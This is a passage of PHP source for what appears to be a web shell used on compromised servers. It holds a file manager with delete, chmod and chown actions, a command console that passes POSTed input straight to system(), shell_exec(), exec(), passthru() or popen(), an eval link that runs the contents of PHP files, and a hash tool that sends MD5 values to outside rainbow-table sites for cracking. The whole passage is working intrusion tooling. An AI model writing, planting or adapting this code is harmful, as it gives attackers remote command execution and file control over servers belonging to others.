								elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; }
								else { echo '>'; } echo $A,'</font>
							</a> (0',
							substr(sprintf('%o',fileperms($_REQUEST['file'])),-3).')<br />
							File Size: '; $S = 0; $B = sprintf('%u', filesize($_GET['file']));while ($B>=1024) { $B/=1024;++$S; }
							if ($S === 0) { echo $B,' Bytes<br />'; }
							else {printf('%.3f %s<br />',$B,$T[$S-1]); $S = 0; }
							if (function_exists('md5_file') && sprintf('%u', filesize($_GET['file'])) <= 209715200) { echo 'MD5: ',md5_file($_GET['file']),'<br />'; }
							if (function_exists('sha1_file') && sprintf('%u', filesize($_GET['file'])) <= 209715200) { echo 'SHA-1: ',sha1_file($_REQUEST['file']),'<br />'; }
							echo 'Last modified: ',date('F d Y H:i:s.',filemtime($_REQUEST['file'])),'<br />
							Is Uploaded File: ',(is_uploaded_file($_GET['file']) ? 'Yes':'No'),'<br />
							Is Executable: ',(is_executable($_GET['file']) ? 'Yes':'No'),'<br />
							Is Writeable: ',(is_writable($_GET['file']) ? 'Yes':'No'),'
						</td>
						<td style="padding-left:6px;">
							<pre>[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=text&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">Text</a>---]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=php&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">PHP</a>----]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=ini&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">INI</a>----]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=image&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">Image</a>--]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=object&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">Object</a>-]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=hexdump&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">HexDump</a>]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=rar&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">RAR</a>----]<br />[<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=zip&amp;dir=',$SCDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">ZIP</a>----]<br />'; if (in_array(substr(strrchr(strtolower($_GET['file']), '.'), 1),array('php','phtml','php3','php4','php5','php6','phtm','phps'))) { echo '[<a style="color:#FF0000;" href="?action=eval&amp;code=',urlencode('if (function_exists(\'file_get_contents\') === FALSE) {function file_get_contents($File) { $handle = fopen($File, \'rb\'); $contents = fread($handle,sprintf(\'%u\',filesize($File)));fclose($handle);return $contents; }} $f = file_get_contents(\''.$_GET['file'].'\'); $NA = substr($f, 0, 2); if (substr($f, 0, 5) === \'<?php\') { $f =  substr($f, 5); } elseif ($NA === \'<?\' || $NA === \'<%\') { $f =  substr($f, 2); } $ND = substr($f, strlen($f) -2); if ($ND === \'?>\' || $ND === \'%>\') { $f =  substr($f, 0, -2); } eval($f);'),'&amp;dir=',$CDIR,'" onmouseover="this.style.fontSize=\'110%\';" onmouseout="this.style.fontSize=\'100%\';">Eval</a>]'; } echo '</pre>
						</td>
					</tr>
				</table>
				<br />
				<span onclick="javascript:var Ans = confirm(\'Are you sure?\'); if (Ans == 1) { window.location = \'?action=file&amp;act=delete&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'\'; }" style="color:red;" onmouseover="this.style.textDecoration = \'underline\';this.style.cursor = \'pointer\';" onmouseout="this.style.textDecoration = \'none\';">Delete</span> 
				| <a href="?action=file&amp;act=rename&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">Rename\Move</a> | 
				<a href="?action=file&amp;act=copy&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">Copy</a> | 
				<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&amp;act=chmod">Chmod</a> | 
				<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&act=chown">Chown</a> | 
				<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&act=chgrp">Chgrp</a> | 
				<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&amp;act=stat">Stat</a> | 
				<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&amp;act=touch">Touch</a> | 
				<a href="?action=file&amp;act=gzip&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">GZip</a> | 
				<a href="?action=file&amp;act=deflate&amp;file=',urlencode($_GET['file']).'&amp;dir=',$SCDIR,'">Deflate</a> | 
				<a href="?action=file&amp;act=base64&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">Base64</a> | 
				<a href="?action=file&amp;act=compress&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">Compress</a>
				<br /><br />';
				if (sprintf('%u', filesize($_GET['file'])) <= 10485760 || isset($_GET['OpenWith']) || in_array($Ext,array('zip','docx','dotx','xpi','dotm','xlsx','xltx','potx','ppsx','pptx','sldx','xlam','xlsb','jar'), TRUE)) {
					if ((!isset($_GET['OpenWith']) && in_array($Ext,array('php','phtml','php3','php4','php5','php6','phtm','phps'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'php')) {
						if (sprintf('%u', filesize($_GET['file'])) === 0) { echo 'PHP Script Size is 0. (No highlighting)'; }
						else {
							if (function_exists('highlight_file')) { echo '<div style="text-align:left;font-size:13px;background-color:white;overflow:auto;padding:2px;">'; highlight_file($_GET['file']); echo '</div>'; }
							elseif (function_exists('show_source')) { echo '<div style="text-align:left;font-size:13px;background-color:white;overflow:auto;padding:2px;">'; show_source($_GET['file']); echo '</div>'; }
							else { echo '<span style="color:red;">Couldn\'t highlight file using highlight_file() or show_source() functions.</span>'; }
						}
					}
					elseif ((!isset($_GET['OpenWith']) && in_array($Ext,array('png','gif','jpg','jpeg','bmp'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'image')) {
						$Size = getimagesize($_GET['file']); echo '<br /><img src="?action=getfile&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'" name="image" id="image" width="',$Size[0],'" height="',$Size[1],'" /><br /><br /><h3>[',$Size[0],'X',$Size[1],'] | <a href="?action=printimg&amp;file=',$SCDIR,urlencode($_GET['file']),'">Print image</a></h3>Dimensions: <input type="text" size="2" onkeyup="document.getElementById(\'image\').style.width= this.value + \'px\';" value="',$Size[0],'" />X<input type="text" name="h" id="h" size="2" onkeyup="document.getElementById(\'image\').style.width= this.value + \'px\';" value="',$Size[1],'" />';
					}
					elseif ((!isset($_GET['OpenWith']) && in_array($Ext,array('ini','inf'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'ini')) {
						echo '<br /><br /><pre style="text-align:left;">';print_r(parse_ini_file($_REQUEST['file'],TRUE)); echo '</pre>';
					}
					elseif ((!isset($_GET['OpenWith']) && in_array($Ext,array('exe','dll','so','bin','obj','com','dylib'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'hexdump')) {
						$Size = sprintf('%u', filesize($_GET['file']));
						if (!isset($_GET['show']) && $Size > 96) { $Size = 96; echo '<a href="?action=file&amp;file=',urlencode($_GET['file']),'&amp;OpenWith=hexdump&amp;dir='.$SCDIR.'&show=1">[+]</a> <strong style="color:red;">Expand to Full</strong><br /><br />'; }
						$File = file_get_contents($_GET['file']);
						echo '<table style="text-align:center;border:1px solid white;color:white;"><col style="background-color:#BB0000;" /><col style="background-color:#585858;" span="16" /><col style="background-color:black;" span="16" />';
						$Last = 16; $ORDedArray = array();
						for ($i = 0; $i < $Size; $i += 16) {
							if ($Size - $i < 16) { $Last = $Size - $i; }
							for ($k = 0; $k < $Last; $k++) { $ORDedArray[$k] = ord($File[$i + $k]); }
							printf('<tr><td>%08X</td>', $i);
							for ($k = 0; $k < $Last; $k++) {
								printf('<td>%02X</td>', $ORDedArray[$k]);
							}
							if ($Last < 16) { for (; $k < 16; $k++) {  echo '<td style="background-color:#1C1C1C;"></td>'; } }
							for ($k = 0; $k < $Last; $k++) {
								if ($ORDedArray[$k] <= 31) { echo '<td>.</td>'; }
								else { echo '<td>', $File[$i + $k], '</td>'; }
							}
							echo '</tr>';
						}
						echo '</table>';
					}
					elseif ((!isset($_GET['OpenWith']) && $Ext === 'rar') || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'rar')) {
						if (class_exists('RarArchive')) {
							$rar_arch = RarArchive::open($_GET['file']);
							if ($rar_arch !== FALSE) {
								$rar_entries = $rar_arch->list();
								if ($rar_entries === FALSE) { echo 'Could not retrieve entries.'; }
								else {
									echo 'Found ',count($rar_entries),' entries.<br />';
									foreach ($rar_entries as $e) {
										echo $e, '<br />';
									}
								}
								$rar_arch->close();
							}
							else { echo 'Could not open RAR archive.'; }
							
						}
						else { echo 'The RarArchive class does not exist.'; }
					
					}

					elseif ((!isset($_GET['OpenWith']) && in_array($Ext,array('zip','docx','dotx','xpi','dotm','xlsx','xltx','potx','ppsx','pptx','sldx','xlam','xlsb','jar'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'zip')) {
						if (function_exists('zip_open')) {
							if (class_exists('ZipArchive')) {
								if (isset($_POST['extdir'])) {
									if (!is_dir(realpath($_POST['extdir']))) { echo 'Invalid directory to extract the files to.'; }
									else {
										$zip = new ZipArchive;
										$res = $zip->open($_GET['file']);
										if ($res === TRUE) {
											$Result = $zip->extractTo($_POST['extdir']);
											$zip->close();
											if ($Result) { echo 'Extracted successfully to \'',htmlspecialchars(realpath($_POST['extdir'])),'\''; }
											else { echo 'Error while extracting files.'; GetLastError(); }
										}
									}
								}
								echo '<h3>Extract to:</h3><form action="" method="post"><input type="text" name="extdir" id="extdir" value="',htmlspecialchars($CDIR),'" size="40" /> <input type="submit" value="Extract" /></form>';
							}
							$ZipRes = zip_open($_GET['file']);
							if (is_resource($ZipRes)) {
								echo '<h3>Zip entries:</h3><table style="text-align:left;"><tr><th>Name</th><th>Size</th><th>Compressed size</th><th>Compression method</th></tr>';
								while ($ZipRead = zip_read($ZipRes)) {
									echo '<tr><td>',zip_entry_name($ZipRead),'</td><td>'; $S = 0; $B = sprintf('%u', zip_entry_filesize($ZipRead));while ($B>=1024) { $B/=1024;++$S; }if ($S === 0) { echo $B,' Bytes'; } else {printf('%.3f %s',$B,$T[$S-1]); $S = 0; } echo '</td><td>'; $S = 0; $B = sprintf('%u', zip_entry_compressedsize($ZipRead));while ($B>=1024) { $B/=1024;++$S; }if ($S === 0) { echo $B,' Bytes'; } else {printf('%.3f %s',$B,$T[$S-1]); $S = 0; } echo '</td><td>',zip_entry_compressionmethod($ZipRead),'</td></tr>';
								}
								echo '</table>';
								zip_close($ZipRes);
							}
							else { echo 'Could not open ZIP archive.'; }
							
						}
						else { echo 'The ZipArchive class does not exist.'; }
					
					}
					elseif ((!isset($_GET['OpenWith']) && in_array($Ext,array('pdf','swf','wav','mid','avi','ogg','wmv','mov','mpg','mp3','doc','svg'), TRUE)) || (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'object')) {
						echo '<object data="?action=getfile&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'" type="';
							if ($Ext === 'pdf') { echo 'application/pdf" width="800" height="800"'; }
							elseif ($Ext === 'doc') { echo 'application/msword" width="800" height="800"'; }
							else {
								if ($Ext === 'swf') { echo 'application/x-shockwave-flash"'; }
								elseif ($Ext === 'wav') { echo 'audio/x-wav"'; }
								elseif ($Ext === 'mid') { echo 'audio/x-midi"'; }
								elseif ($Ext === 'avi') { echo 'video/avi"'; }
								elseif ($Ext === 'ogg') { echo 'application/ogg"'; }
								elseif ($Ext === 'wmv') { echo 'video/x-ms-wmv"'; }
								elseif ($Ext === 'mov') { echo 'video/quicktime" codebase="http://www.apple.com/qtactivex/qtplugin.cab" classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"'; }
								elseif ($Ext === 'mpg') { echo 'video/mpeg"'; }
								elseif ($Ext === 'mp3') { echo 'audio/mpeg"'; }
								elseif ($Ext === 'svg') { echo 'image/svg+xml"'; }
								echo ' width="320" height="260"';
							}
							
							echo '><param name="src" value="?action=getfile&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'"><param name="movie" value="?action=getfile&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'"><param name="controller" value="true"><param name="autoplay" value="false"><param name="autoStart" value="0">Your browser does not support this Object type or you don\'t have the needed Plug-in. (alt: <a href="?action=getfile&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'">Direct Link</a>)
							</object>';
					}
					elseif (isset($_GET['OpenWith']) && $_GET['OpenWith'] === 'base64') {
						echo '<textarea cols="90" rows="25" style="overflow:auto;" spellcheck="false">',base64_encode(file_get_contents($_GET['file'])),'</textarea>';
					}
					else {
						echo '<form action="" method="post" id="form"><textarea cols="90" rows="25" style="overflow:auto;" id="fileEdit" name="fileEdit" spellcheck="false">'; echo htmlspecialchars(file_get_contents($_GET['file'])),'</textarea><br /><br /><input type="submit" value="Save" id="save" name="save" /> <button onclick="document.getElementById(\'fileEdit\').select();" type="button">Select all</button> <select onchange="javascript:document.getElementById(\'language\').style.display=\'inline\';document.getElementById(\'lightit\').style.display=\'inline\'; if(this.value=\'quickhighlighter.com\') {document.getElementById(\'AdditionalArgs\').innerHTML=\'&lt;input type=\\\'hidden\\\' id=\\\'submit\\\' name=\\\'submit\\\' value=\\\'Highlight!\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'word_wrap\\\' name=\\\'word_wrap\\\' value=\\\'true\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'tab_width\\\' name=\\\'tab_width\\\' value=\\\'4\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'strict_mode\\\' name=\\\'strict_mode\\\' value=\\\'on\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'default_color\\\' name=\\\'default_color\\\' value=\\\'000099\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'line_numbers\\\' name=\\\'line_numbers\\\' value=\\\'2\\\' /&gt;&lt;input type=\\\'hidden\\\' id=\\\'highlight_keywords\\\' name=\\\'highlight_keywords\\\' value=\\\'on\\\' /&gt;\'; }"><option value="deafult">Send to highlight:</option><option value="quickhighlighter.com">quickhighlighter.com</option></select><div style="display:none;" id="AdditionalArgs"></div> <select style="display:none;" name="language" id="language"><option value="abap">ABAP</option><option value="actionscript">ActionScript</option><option value="actionscript3">ActionScript 3</option><option value="ada">Ada</option><option value="apache">Apache configuration</option><option value="applescript">AppleScript</option><option value="apt_sources">Apt sources</option><option value="asm">ASM</option><option value="asp">ASP</option><option value="autoit">AutoIt</option><option value="autohotkey">AutoHotKey</option><option value="avisynth">AviSynth</option><option value="bash">Bash</option><option value="basic4gl">Basic4GL</option><option value="bf">Brainfuck</option><option value="blitzbasic">BlitzBasic</option><option value="bnf">bnf</option><option value="boo">Boo</option><option value="c">C</option><option value="c_mac">C (Mac)</option><option value="caddcl">CAD DCL</option><option value="cadlisp">CAD Lisp</option><option value="cfdg">CFDG</option><option value="cfm">ColdFusion</option><option value="cil">CIL</option><option value="cobol">COBOL</option><option value="cpp">C++</option><option class="sublang" value="cpp-qt">&nbsp;&nbsp;C++ (QT)</option><option value="csharp">C#</option><option value="css">CSS</option><option value="cuesheet">CueSheet</option><option value="d">D</option><option value="delphi">Delphi</option><option value="diff">Diff</option><option value="div">DIV</option><option value="dos">DOS</option><option value="dot">dot</option><option value="eiffel">Eiffel</option><option value="email">eMail (mbox)</option><option value="fsharp">F#</option><option value="fortran">Fortran</option><option value="freebasic">FreeBasic</option><option value="genero">genero</option><option value="gettext">GNU Gettext</option><option value="glsl">glSlang</option><option value="gml">GML</option><option value="gnuplot">Gnuplot</option><option value="groovy">Groovy</option><option value="haskell">Haskell</option><option value="hq9plus">HQ9+</option><option value="html4strict">HTML</option><option value="idl">Uno Idl</option><option value="ini">INI</option><option value="inno">Inno</option><option value="intercal">INTERCAL</option><option value="io">Io</option><option value="java">Java</option><option value="java5">Java(TM) 2 Platform Standard Edition 5.0</option><option value="javascript">Javascript</option><option value="jquery">jQuery</option><option value="kixtart">KiXtart</option><option value="klonec">KLone C</option><option value="klonecpp">KLone C++</option><option value="latex">LaTeX</option><option value="lisp">Lisp</option><option value="lolcode">LOLcode</option><option value="lotusformulas">Lotus Notes @Formulas</option><option value="lotusscript">LotusScript</option><option value="lscript">LScript</option><option value="lua">Lua</option><option value="mapbasic">Map Basic</option><option value="m68k">Motorola 68000 Assembler</option><option value="make">GNU make</option><option value="matlab">Matlab M</option><option value="mirc">mIRC Scripting</option><option value="mpasm">Microchip Assembler</option><option value="mxml">MXML</option><option value="mysql">MySQL</option><option value="newlisp">NewLisp</option><option value="nsis">NSIS</option><option value="objc">Objective-C</option><option value="ocaml">OCaml</option><option class="sublang" value="ocaml-brief">&nbsp;&nbsp;OCaml (brief)</option><option value="oobas">OpenOffice.org Basic</option><option value="oracle11">Oracle 11 SQL</option><option value="oracle8">Oracle 8 SQL</option><option value="pascal">Pascal</option><option value="per">per</option><option value="perl">Perl</option><option value="perl6">Perl 6</option><option selected="selected" value="php">PHP</option><option class="sublang" value="php-brief">&nbsp;&nbsp;PHP (brief)</option><option value="pic16">PIC16</option><option value="pike">Pike</option><option value="pixelbender">Pixel Bender 1.0</option><option value="plsql">PL/SQL</option><option value="povray">POVRAY</option><option value="powershell">posh</option><option value="powerbuilder">Power Builder</option><option value="progress">Progress</option><option value="prolog">Prolog</option><option value="providex">ProvideX</option><option value="python">Python</option><option value="purebasic">PureBasic</option><option value="qbasic">QBasic/QuickBASIC</option><option value="rails">Rails</option><option value="reg">Microsoft Registry</option><option value="robots">robots.txt</option><option value="ruby">Ruby</option><option value="sas">SAS</option><option value="scala">Scala</option><option value="scheme">Scheme</option><option value="scilab">SciLab</option><option value="sdlbasic">sdlBasic</option><option value="smalltalk">Smalltalk</option><option value="smarty">Smarty</option><option value="sql">SQL</option><option value="tcl">TCL</option><option value="teraterm">Tera Term Macro</option><option value="text">Text</option><option value="thinbasic">thinBasic</option><option value="tsql">T-SQL</option><option value="typoscript">TypoScript</option><option value="vb">Visual Basic</option><option value="vbnet">vb.net</option><option value="verilog">Verilog</option><option value="vhdl">VHDL</option><option value="vim">Vim Script</option><option value="visualfoxpro">Visual Fox Pro</option><option value="visualprolog">Visual Prolog</option><option value="whitespace">Whitespace</option><option value="whois">Whois Response</option><option value="winbatch">Winbatch</option><option value="xml">XML</option><option value="xorg_conf">Xorg configuration</option><option value="xpp">X++</option><option value="z80">ZiLOG Z80 Assembler</option></select> <input type="submit" value="Highlight code" id="lightit" style="display:none;" onclick="document.getElementById(\'form\').action=\'http://quickhighlighter.com/code-syntax-highlighter.php\';document.getElementById(\'fileEdit\').id=\'source\';document.getElementById(\'source\').name=\'source\';" /></form>';
					}
				}
				else {
					echo '\'',htmlspecialchars($_GET['file']),'\' is too big (>10MiB) to send.';
				}
			}
		}
		else {
			echo '\'',htmlspecialchars($_GET['file']),'\' Does Not Exist.<br /><br /><a href="?dir=',$SCDIR,'&amp;action=cmd&amp;act=FileMake&amp;value=',urlencode($_GET['file']),'" target="_blank">Create?</a>';
		}
	}
	if ($_GET['action'] === 'CLI') {
		echo '<form action="" method="post"><table><tr><td valign="center"><span style="font-weight:bold;color:white;">',htmlspecialchars($CDIR),' &gt;<span style="text-decoration:blink;">_</span></span></td><td><input type="text" style="background-color:#1C1C1C;width:400px;border:none;" name="c" id="c" '; if (isset($_POST['c'])) { echo 'value="',htmlspecialchars($_POST['c']),'"'; } echo ' /></td><td valign="center"><input type="submit" value="Exec" style="-moz-border-radius-bottomright:0px;-webkit-border-bottom-left-radius:0px;background-color:black;"></td></tr></table><br /><textarea readonly="readonly" cols="82" rows="17" style="overflow:auto;background-color:#000000">';
		if (function_exists('system')) { system($_POST['c']); }
		elseif (function_exists('shell_exec')) { echo shell_exec($_POST['c']); }
		elseif (function_exists('exec')) { $ExecArray = array(); exec($_POST['c'],$ExecArray); foreach ($ExecArray AS $Arr) { echo $Arr,"\r\n"; } }
		elseif (function_exists('passthru')) { passthru($_POST['c']); }
		elseif (function_exists('popen')) { $Read=''; $Handle = popen($_POST['c'],'r'); while ($Read = fread($Handle,2096)) { echo $Read; } pclose($Handle); }
		else { echo 'Could not execute command using system(), shell_exec(), passthru(), exec() && popen().'; }
		echo '</textarea>';
	}
	elseif ($_GET['action'] === 'dir') {
		echo '<div style="width:500px;text-align:left;background-color:#282828;"><fieldset>
		<legend><a href="?dir=',urlencode(realpath($_GET['dirname'])),'"><h3>',htmlspecialchars(realpath($_GET['dirname'])),'</h3></a></legend>
		Permissions: <a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',$_GET['dirname'],'&amp;act=chmod"><font'; $A = GetPerms($_GET['dirname']); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A.'</font></a> (0'.substr(sprintf('%o',fileperms($_GET['dirname'])),-3).')<br />
		Last Modified: ',date ('F d Y H:i:s.', filemtime($_GET['dirname'])),'<br />
		Last Accessed: ',date ('F d Y H:i:s.', fileatime($_GET['dirname'])),'<br />
		Last Inode Change: ',date ('F d Y H:i:s.', filectime($_GET['dirname'])),'<br />';
		$dir = array();
		if (function_exists('scandir')) { $dir = scandir($_GET['dirname']); }
		elseif (function_exists('glob')) { $dir = glob($_GET['dirname']); $GLOB = TRUE; }
		elseif (function_exists('opendir') && function_exists('readdir')) { $i = 0; $Handle = opendir($_GET['dirname']); while (($File = readdir($Handle))) { $dir[$i++] = $File; } closedir($Handle); }
		if (count($dir) !== 0) {
			$Dirs = 0; $Files = 0;
			foreach ($dir AS $FILE) {
				if (is_dir($FILE)) {++$Dirs; }
				else {++$Files; }
			}
			if (!isset($GLOB)) { $Dirs -= 2; }
			echo 'Contains ',$Files,' files and ',$Dirs, ' Directories<br />';
		}
		echo '</fieldset></div>';
	}
	elseif ($_GET['action'] === 'encoder') {
		echo '<h1>Encoder/Decoder/Hasher/Base converter/MD5 cracker</h1><form method="post" action=""><table style="text-align:right;"><tr><td>Text:</td><td><input type="text" size="45" style="margin-left:6px;" name="Plain" id="Plain"'; if (isset($_POST['Plain'])) { echo ' value="',htmlspecialchars($_POST['Plain']),'"'; } echo ' /></td></tr><tr><td>HMAC Key:</td><td><input type="text" size="45" style="margin-left:2px;" name="HMACKey" id="HMACKey"'; if (isset($_POST['HMACKey'])) { echo ' value="',htmlspecialchars($_POST['HMACKey']),'"'; } echo ' /></td></tr><tr><td>Crypt() salt:</td><td><input type="text" size="45" name="CSalt" id="CSalt"'; if (isset($_POST['CSalt'])) { echo ' value="',htmlspecialchars($_POST['CSalt']),'"'; } echo ' /></td></tr></table><br /><br /><input type="submit" value="Calculate" /></form>';
		if (isset($_POST['Plain'])) {
			echo '<br /><br /><fieldset style="width:420px;"><legend>Hashesums</legend><table><tr style="text-align: right;"><td>
			Crypt: <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="'; if (empty($_POST['CSalt'])) { echo crypt($_POST['Plain']); } else { echo crypt($_POST['Plain'],$_POST['CSalt']); } echo '" /><br />';
			if (function_exists('hash') && empty($_POST['HMACKey'])) { $Hashes = hash_algos();foreach ($Hashes AS $HASH) { echo strtoupper($HASH).': <input type="text" onfocus="this.select()" onmouseover="this.select()"  size="40" readonly="readonly" value="',hash($HASH,$_POST['Plain']).'" /><br />'; }}
			elseif (!empty($_POST['HMACKey']) && function_exists('hash_hmac')) { $Hashes = hash_algos();foreach ($Hashes AS $HASH) { echo strtoupper($HASH).' HMAC: <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="',hash_hmac($HASH,$_POST['Plain'],$_POST['HMACKey']).'" /><br />'; }}
			elseif (function_exists('mhash')) {
					$Hashes = array('ADLER32',MHASH_ADLER32,'CRC32',MHASH_CRC32,'CRC32B',MHASH_CRC32B,'GOST',MHASH_GOST,'HAVAL128',MHASH_HAVAL128,'HAVAL160',MHASH_HAVAL160,'HAVAL192',MHASH_HAVAL192,'HAVAL256',MHASH_HAVAL256,'MD4',MHASH_MD4,'MD5',MHASH_MD5,'RIPEMD160',MHASH_RIPEMD160,'SHA1',MHASH_SHA1,'SHA256',MHASH_SHA256,'TIGER',MHASH_TIGER,'TIGER128',MHASH_TIGER128,'TIGER160',MHASH_TIGER160);
					if (empty($_POST['HMACKey'])) {
						for ($i = 0, $j = 0; $i < 16; $i++, $j+=2) {
							echo $Hashes[$j],': <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="',bin2hex(mhash($Hashes[$j+1],$_POST['Plain'])),'" /><br />';
						}
					}
					else {
						for ($i = 0, $j = 0; $i < 16; $i++, $j+=2) {
							echo $Hashes[$j],' HMAC: <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="',bin2hex(mhash($Hashes[$j+1],$_POST['Plain'],$_POST['HMACKey'])),'" /><br />';
						}	
					}
					
			}
			else {
				echo 'MD5: <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="',md5($_POST['Plain']),'" />'; if (function_exists('sha1')) { echo '<br />SHA-1: <input type="text" onfocus="this.select()" onmouseover="this.select()" size="40" readonly="readonly" value="',sha1($_POST['Plain']),'" />'; } if (function_exists('crc32')) { echo '<br />CRC-32: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',crc32($_POST['Plain']),'" />'; }
			}
			echo '</tr></table></fieldset><br /><fieldset style="width:450px;"><legend>Encoder\Decoder</legend><table><tr style="text-align:right;"><td>
			Base64 Encode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',base64_encode($_POST['Plain']),'" /><br />
			Base64 Decode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',base64_decode($_POST['Plain']),'" /><br />
			URL Encode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',urlencode($_POST['Plain']),'" /><br />
			URL Decode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',htmlspecialchars(urldecode($_POST['Plain'])),'" /><br />
			HTMLSpecialChars Encode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',str_replace('&','&amp;', htmlspecialchars($_POST['Plain'])),'" /><br />';
			if (function_exists('htmlspecialchars_decode')) { echo 'HTMLSpecialChars Decode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',htmlspecialchars(htmlspecialchars_decode($_POST['Plain'])),'" /><br />'; }
			if (function_exists('convert_uuencode')) { echo 'UUEncode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',htmlspecialchars(convert_uuencode($_POST['Plain'])),'" /><br />'; }
			if (function_exists('convert_uudecode')) { echo 'UUDecode: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',convert_uudecode($_POST['Plain']),'" /><br />'; }
			echo 'ROT13: <input type="text" onfocus="this.select()" onmouseover="this.select()" readonly="readonly" value="',htmlspecialchars(str_rot13($_POST['Plain'])),'" />
			</td></tr></table></fieldset>';
			if (is_numeric($_POST['Plain'])) {
				$Bases = array('Hex2Dec',16,10,'Hex2Oct',16,8,'Hex2Bin',16,2,'Dec2Hex',10,16,'Dec2Oct',10,8,'Dec2Bin',10,2,'Oct2Hex',8,16,'Oct2Dec',8,10,'Oct2Bin',8,2,'Bin2Hex',2,16,'Bin2Dec',2,10,'Bin2Oct',2,8);
				echo '<br /><fieldset style="width:640px;"><legend>Base Convertor</legend><table><tr><td>';
				for ($i = 0, $j = 0; $i < 12; $i++, $j+=3) {
					if ($i % 3 === 0) { echo '</td><td>'; }
					echo $Bases[$j],': <input type="text" onfocus="this.select()" onmouseover="this.select()" size="20" readonly="readonly" value="',base_convert($_POST['Plain'],$Bases[$j+1],$Bases[$j+2]),'" />';
				}
				echo '</td></tr></table></fieldset>';
				unset($Bases);
			}
			if (preg_match('/^[0-9a-zA-Z]{32}$/',$_POST['Plain'])) {
				echo '<br /><fieldset style="width:630px;"><legend>MD5 Cracking By Rainbow Tables</legend>
				<form action="http://www.hashchecker.de/',$_POST['Plain'],'" method="get" target="_blank" style="display:inline;"><input type="submit" value="www.hashchecker.de" /></form><br />
				<table style="text-align:left;"><tr>
				<td><form action="http://md5.noisette.ch/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="md5.noisette.ch" style="width:150px;"></form></td>
				<td><form action="http://www.bigtrapeze.com/md5/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="query" name="query" value="',$_POST['Plain'],'" /><input type="submit" value="www.bigtrapeze.com" style="width:150px;" /></form></td>
